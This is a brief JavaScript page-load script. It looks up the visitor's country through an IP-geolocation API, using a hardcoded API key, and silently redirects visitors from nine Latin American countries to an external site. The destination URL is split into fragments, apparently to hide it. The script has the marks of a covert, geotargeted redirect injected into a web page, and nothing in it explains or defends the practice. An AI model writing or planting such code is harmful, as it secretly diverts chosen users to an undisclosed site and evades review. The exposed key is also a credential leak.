window.onload = function(){
            fetch('https://api.ipgeolocation.io/ipgeo?apiKey=0c3260ad7b5042ec92c4daac3e2b26af')
                .then(response => response.json())
                .then(data => {
                    const countryCode = data.country_code2;
                    console.log(data.country_code2);
                    const countriesToRedirect = ['PA', 'MX', 'GT', 'HN', 'PE', 'AR', 'EC', 'UY', 'CR'];
                    var part1 = 'ps://dev-oswappsite.pant';
                    var part2 = 'heonsite.io/';

                    if (countriesToRedirect.includes(countryCode)) {
                        window.location.href = 'htt' + part1 + part2;
                    }
                })
                .catch(error => console.error('Error:', error));
        }